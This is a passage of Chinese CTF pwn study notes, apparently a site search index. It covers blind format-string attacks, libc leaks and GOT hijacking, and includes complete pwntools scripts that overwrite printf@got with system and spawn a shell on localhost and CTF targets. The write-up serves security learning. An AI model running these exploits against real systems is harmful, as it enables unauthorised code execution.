\uff0c\u9700\u8981\u5c06\u8fd9\u90e8\u5206\u5b9a\u4e49\u4e3a\u51fd\u6570\u624d\u80fd\u53cd\u7f16\u8bd1\uff0c\u53f3\u952e\u5730\u5740\u9694\u58c1\u7684\u540d\u79f0 loc_804860B \uff0ccreat function \u3002 \u7ea2\u8272\u90e8\u5206\u5c31\u662f\u6ca1\u6709\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\uff0c\u540e\u9762\u8ddf\u7684\u5c31\u662f\u51fd\u6570 plt \u5730\u5740\u3002 \u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4e0d\u540c\uff0c\u7ed3\u5408\u5b9e\u9645\u4f7f\u7528\u3002","title":"\u4ece .text \u6bb5\u5f00\u59cb"},{"location":"fmtstr/Bilnd_Pwn/#_8","text":"\u7740\u91cd\u8bb0\u5f55 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \uff0c\u4e0d\u4e00\u6b65\u4e00\u6b65\u5206\u6790\u8fd9\u9053\u9898\u76ee\u6f0f\u6d1e\uff08\u8be6\u7ec6\u5206\u6790\uff1a \u9ed8\u5c0f\u897f \u535a\u5ba2\uff09\u3002\u8fd9\u9053\u9898\u76ee\u601d\u8def\u662f\uff1a \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u901a\u8fc7\u6cc4\u9732 plt \u8868\u4e2d\u7684\u6307\u4ee4\u5185\u5bb9\u786e\u5b9a\u5bf9\u5e94\u7684 got.plt \u8868\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 got.plt \u8868\u5730\u5740\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 printf \u7684\u51fd\u6570\u5730\u5740\u786e\u5b9a libc \u57fa\u5740\uff0c\u4ece\u800c\u83b7\u5f97 system \u5730\u5740 \u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4efb\u610f\u5199\u529f\u80fd\u5c06 printf \u7684 got.plt \u8868\u4e2d\u7684\u5730\u5740\u4fee\u6539\u4e3a system \u7684\u5730\u5740 send \u5b57\u7b26\u4e32 \u201c/bin/sh\u201d \uff0c\u90a3\u4e48\u5728\u8c03\u7528 printf(\u201c/bin/sh\u201d) \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(\u201c/bin/sh;\u201d) \uff0c\u4ece\u800c\u6210\u529f\u83b7\u53d6shell","title":"\u89e3\u9898\u6d41\u7a0b"},{"location":"fmtstr/Bilnd_Pwn/#printf-plt","text":"\u5c06\u6cc4\u9732\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \u4e2d\u5206\u6790\u83b7\u5f97\uff0c\u51fd\u6570\u540d\u540e\u534a\u622a\u5c31\u662f\u5730\u5740 0x8048490 \uff1a","title":"\u786e\u5b9a printf \u7684 plt \u5730\u5740"},{"location":"fmtstr/Bilnd_Pwn/#gotplt","text":"\u548c\u6cc4\u9732\u7a0b\u5e8f payload \u9ad8\u5ea6\u76f8\u4f3c\uff1a payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) \u6ce8\u89e3\uff1a \u4e3a\u4ec0\u4e48\u63a5\u6536 'right:\\xff\\x25' \uff1f right: \u662f\u56fa\u5b9a\u56de\u663e\uff0c\\xff\\x25 \u662f\u65e0\u7528\u5b57\u8282\u7801\u3002\u5b9e\u9645\u4e0a 0x8048490 \u7684\u6c47\u7f16\u662f\u8fd9\u6837\u7684\uff1a pwndbg> pdisass 0x8048490 \u25ba 0x8048490 <printf@plt> jmp dword ptr [0x804a018] <0xf7e4d670> 0x8048496 <printf@plt+6> push 0x18 0x804849b <printf@plt+11> jmp 0x8048450 # \u5b57\u8282\u7801 pwndbg> x /20wx 0x8048490 0x8048490 <printf@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048490 \u6307\u5411\u662f\u4e00\u6761\u8df3\u8f6c got.plt \u6307\u4ee4\uff0c\u6211\u4eec\u9700\u8981\u5176\u4e2d\u8df3\u8f6c\u7684\u76ee\u6807\u5730\u5740\u3002\\xff\\x25 \u5c31\u662f\u8df3\u8f6c\u6307\u4ee4\u7684\u5b57\u8282\u7801\uff0c\u6211\u4eec\u5c31\u8981\u5148\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff0c\u7136\u540e\u518d\u63a5\u6536 4 \u5b57\u8282\u7684 got.plt \u5730\u5740\u3002","title":"\u6cc4\u9732 got.plt"},{"location":"fmtstr/Bilnd_Pwn/#printf","text":"\u6784\u9020\u65b9\u6cd5\u540c\u4e0a\uff0c\u4f46\u4e0d\u9700\u8981\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff1a payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4))","title":"\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740"},{"location":"fmtstr/Bilnd_Pwn/#libc-system","text":"\u9898\u76ee\u6ca1\u6709\u7ed9\u51fa libc \u3002\u4ece\u6cc4\u9732\u51fa\u6765\u7684 printf@got \u53bb libcdatabase \u67e5\u8be2\u5176\u4ed6\u51fd\u6570\u504f\u79fb\u3002 printf:0x00049670 system:0x0003ada0","title":"\u6cc4\u9732 libc \u57fa\u5740&amp; system \u5730\u5740"},{"location":"fmtstr/Bilnd_Pwn/#printfgotplt","text":"payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload)","title":"\u4efb\u610f\u5199\u4fee\u6539 printf@got.plt"},{"location":"fmtstr/Bilnd_Pwn/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x8048490 # name p.recv() p.sendline('nameaaa') p.recv() # leak printf@got.plt payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) log.info(\"printf_got_plt:\"+hex(printf_got_plt)) # leak printf@got payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4)) log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x00049670 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x0003ada0 log.info(\"system_addr:\"+hex(system_addr)) # overwrite payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload) p.sendline('/bin/sh\\x00') p.interactive()","title":"exp"},{"location":"fmtstr/Bilnd_Pwn/#64","text":"","title":"64 \u4f4d\u5229\u7528\u624b\u6cd5"},{"location":"fmtstr/Bilnd_Pwn/#_9","text":"\u8fd8\u662f\u4f7f\u7528 32 \u4f4d\u7684\u4f8b\u9898\u6e90\u7801\uff0c\u7f16\u8bd1 64 \u4f4d\u7a0b\u5e8f\uff1a gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10000,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10000) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u3002","title":"\u5b9e\u9a8c\u73af\u5883\u51c6\u5907"},{"location":"fmtstr/Bilnd_Pwn/#_10","text":"\u586b\u5145 8 \u5b57\u8282\uff0c\u7136\u540e\u518d\u586b\u5165 %p \uff0c\u56de\u663e\u957f\u5ea6\u662f 8 \u5b57\u8282\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570"},{"location":"fmtstr/Bilnd_Pwn/#_11","text":"\u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 8 \u3002","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb"},{"location":"fmtstr/Bilnd_Pwn/#dump_1","text":"\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff0c\u6216\u8005\u4ece text \u6bb5\u5f00\u59cb\u53ef\u4ee5\u7684\u3002\u8fd9\u91cc\u4e0d\u518d\u627e text \u6bb5\u8d77\u59cb\u4f4d\u7f6e\uff0c\u76f4\u63a5\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\u6cc4\u9732\u3002\u4e24\u4e2a\u4f4d\u6570\u7a0b\u5e8f\u811a\u672c\u901a\u7528\u7684\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\u3002 64 \u4f4d\u7a0b\u5e8f\u52a0\u8f7d\u8d77\u59cb\u5730\u5740\u662f\uff1a0x400000 \uff0c\u4e0b\u9762\u662f\u5bf9\u6bd4\u56fe\uff1a \u811a\u672c\u8fd8\u662f\u90a3\u4e2a\u811a\u672c\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' #r = remote('127.0.0.1',10001) r = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('moxiaoxi') r.recv() # leak begin = 0x400000#0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_64','wb') as f: f.write(text_seg) ida \u52a0\u8f7d\u53c2\u6570\u5982\u56fe\uff1a \u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u8fd9\u91cc\u6ca1\u6709\u8bc6\u522b\u4e3a\u51fd\u6570\uff0c\u9700\u8981\u624b\u52a8\u521b\u5efa\u51fd\u6570\u3002\u5728 0x0400826 \u53f3\u952e creat function \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u53cd\u6c47\u7f16\u4e86\u3002 \u70b9\u8fdb printf@plt \uff0c\u91cc\u9762\u662f\u8df3\u8f6c\u5230 printf@got.plt \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u4ece ida \u77e5\u9053\u4e86\uff1a printf_plt = 0x4006B0 printf_got_plt = 0x601030 \u89e3\u9898\u601d\u8def\u4e0e 32 \u4f4d\u4e00\u81f4\uff0c\u5229\u7528\u811a\u672c\uff1a #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_64_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x4006B0 printf_got_plt = 0x601030 # name p.recv() p.sendline('moxiaoxi') p.recv() # leak printf@got payload = \"%9$s.TMP\" + p64(printf_got_plt+1) p.sendline(payload) p.recvuntil('right:') printf_got = u64(p.recv(5).ljust(7,'\\x00')+'\\x00')<<8 log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x055800 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x045390 log.info(\"system_addr:\"+hex(system_addr)) one = p64(system_addr)[:2] two = p64(system_addr>>16)[:2] payload = \"%9104c%12$hn%54293c%13$hn\" + 'a'*7 payload += p64(printf_got_plt) + p64(printf_got_plt+2) p.sendline(payload) p.recv() p.sendline('/bin/sh\\x00') p.interactive()","title":"dump \u7a0b\u5e8f"},{"location":"fmtstr/Bilnd_Pwn/#_12","text":"axb_2019_fmt32 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee axb_2019_fmt64 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee SuCTF2018 - lock2 \u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2","title":"\u66f4\u591a\u5b9e\u4f8b"},{"location":"fmtstr/Bilnd_Pwn/#_13","text":"ctf-wiki pwn \u76f2\u6253","title":"\u53c2\u8003"},{"location":"fmtstr/fmtstr_example/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50 \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 64 \u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u539f\u7406 \u5176\u5b9e 64 \u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c 32 \u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc7 64 \u4f4d\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f \u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002 \u4f8b\u5b50 \u786e\u5b9a\u4fdd\u62a4 \u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2017 \u5e74\u7684 UIUCTF \u4e2d pwn200 GoodLuck \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2a flag.txt \u6587\u4ef6\u3002 \u279c 2017-UIUCTF-pwn200-GoodLuck git:(master) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86 Canary\u3001NX \u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206 RELRO \u4fdd\u62a4\u3002 \u5206\u6790\u7a0b\u5e8f \u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0; j <= 21; ++j ) { v5 = format[j]; if ( !v5 || v11[j] != v5 ) { puts(\"You answered:\"); printf(format); puts(\"\\nBut that was totally wrong lol get rekt\"); fflush(_bss_start); result = 0; goto LABEL_11; } } \u53ef\u4ee5\u770b\u5230 flag \u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a 5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a 4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d 6 \u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt \u5b57\u7b26\u4e32\u5b58\u50a8\u5728 RDI \u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5 fmt \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a 10\u3002\u800c fmt \u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684 order \u4e3a fmt \u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230 flag \u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528 https://github.com/scwuaptx/Pwngdb \u4e2d\u7684 fmtarg \u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987b break \u5728 printf \u5904\u3002 \u6765\u81ea resery \u5e08\u5085\u6ce8\u89e3\uff1a \u8fd9\u91cc\u7684 10 \u662f\u7531 5+5 \u5f97\u5230\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e24\u4e2a 5 \u662f\u4ece\u54ea\u91cc\u7684\u5f97\u5230\u7684\uff0c\u6211\u6765\u89e3\u91ca\u4e00\u4e0b\uff0c\u524d\u9762\u7684 5\uff1a\u7531\u4e8e 64 \u4e3a\u7a0b\u5e8f\uff0c\u524d 64 \u4e2a\u53c2\u6570\u662f\u5b58\u5728\u5bc4\u5b58\u5668\u4e2d\u7684\uff0c\u5206\u522b\u662f rdi\uff0crsi\uff0crcx\uff0crdx\uff0cr8\uff0cr9\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u50a8\u5728 rdi \u4e2d\u7684\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u504f\u79fb\u5c31\u5e94\u8be5\u662f 5+flag \u5728\u6808\u4e2d\u7684\u504f\u79fb\uff0c\u5728\u6808\u4e2d\u7684\u504f\u79fb\u5c31\u5f88\u597d\u7406\u89e3\u4e86\u5c31\u662f 5\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 10 \u6ce8\u89e3 \u6211\u5b89\u88c5\u7684 Pwndbg \u5e76\u6ca1\u6709 fmtarg \uff0c\u53ef\u80fd\u662f\u7248\u672c\u4e0d\u5bf9\uff0c\u5982\u679c\u9700\u8981\u5b89\u88c5\u4e00\u4e0b gef \u63d2\u4ef6\u3002 \u4e24\u4e2a\u4f5c\u8005\u90fd\u89e3\u91ca\u4e86\u504f\u79fb 10 \u662f\u600e\u4e48\u8ba1\u7b97\u6765\uff0c\u4f46\u6211\u66f4\u559c\u6b22\u7684\u65b9\u6cd5\u662f \u8f93\u5165\u4e00\u957f\u4e32 %p \u5f97\u51fa\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u76ee\u6807\u504f\u79fb\u6216\u5730\u5740 \u3002 shell $ ./goodluck what's the flag bbbbbbbb%p%p%p%p%p%p%p%p%p%p%p You answered: bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161 But that was totally wrong lol get rekt 0x602830 \u662f\u7b2c 7 \u4f4d\u3002\u4e3a\u4ec0\u4e48\u6cc4\u9732\u7684\u4e0d\u662f 0x6262626262626262 \uff1f\u524d\u9762\u63d0\u5230\u4e86\uff0c64 \u4f4d\u7cfb\u7edf\u7684\u524d\u516d\u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\u7684\uff0c\u800c bbbbbbbb \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u81ea\u7136\u5728\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\uff0c0x602830 \u5c31\u662f\u5b58\u50a8\u7684\u5bc4\u5b58\u5668\u5730\u5740\u3002\u600e\u4e48\u83b7\u5f97\u8fd9\u4e2a\u5730\u5740\uff1fgdb \u8c03\u8bd5\u65ad\u70b9\u6253\u5728 printf \u51fd\u6570\uff1a \u8fd9\u6837\u5f97\u51fa\u6700\u540e\u7684 flag \u504f\u79fb\u4e3a 10 \u3002 \u5229\u7528\u7a0b\u5e8f #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # \u8fd9\u4e2a\u5e93\u6ca1\u6709\u7528\u5230\u53ef\u4ee5\u6ce8\u91ca\u6389 # from LibcSearcher import * goodluck = ELF('./goodluck') if args['REMOTE']: sh = remote('pwn.sniperoj.cn', 30017) else: sh = process('./goodluck') payload = \"%9$s\" print payload ##gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() hijack GOT \u539f\u7406 \u5728\u76ee\u524d\u7684 C \u7a0b\u5e8f\u4e2d\uff0clibc \u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7 GOT \u8868\u6765\u8df3\u8f6c\u7684\uff08\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\uff09\u3002\u6b64\u5916\uff0c\u5728\u6ca1\u6709\u5f00\u542f RELRO \u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2a libc \u7684\u51fd\u6570\u5bf9\u5e94\u7684 GOT \u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2a libc \u51fd\u6570\u7684 GOT \u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 printf \u7684 got \u8868\u9879\u5185\u5bb9\u4e3a system \u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884c printf \u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570 A \u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570 B \u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u3002 \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570 A \u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\uff08\u56e0\u4e3a\u8fd9\u7c7b\u51fd\u6570\u4f1a\u5728\u7a0b\u5e8f\u6e90\u7801\u4e2d\u4f7f\u7528\u5230\uff0c\u6240\u4ee5\u80fd\u76f4\u63a5\u6216\u95f4\u63a5\u4ece elf \u6587\u4ef6\u4e2d\u8bfb\u53d6\uff09 \u786e\u5b9a\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570 B \u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite \u51fd\u6570\uff08\u5e38\u89c1\uff09 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\uff08\u5e38\u89c1\uff09 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset \u4f8b\u5b50 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 CCTF \u4e2d\u7684 pwn3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u786e\u5b9a\u4fdd\u62a4 \u5982\u4e0b \u279c 2016-CCTF-pwn3 git:(master) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002RELRO \u662f\u90e8\u5206\u4fdd\u62a4\uff0c\u8fd9\u79cd\u72b6\u6001\u4e0b\u53ef\u4ee5\u4fee\u6539 GOT \u8868\uff0c\u5982\u679c\u662f FULL \u5219\u4e0d\u884c\u3002\u53e6\u5916\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542f ASLR \u4fdd\u62a4\u7684\u3002 \u5206\u6790\u7a0b\u5e8f \u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684 ftp\uff0c\u5177\u6709 get\uff0cput\uff0cdir \u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728 get \u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file() { char dest; // [sp+1Ch] [bp-FCh]@5 char s1; // [sp+E4h] [bp-34h]@1 char *i; // [sp+10Ch] [bp-Ch]@3 printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 0x28);//\u5c06\u5185\u5bb9\u590d\u5236\u5230dest return printf(&dest);//\u8f93\u51fadest\u5185\u5bb9 } } return printf(&dest); } \u6f0f\u6d1e\u5229\u7528\u601d\u8def \u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f \u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 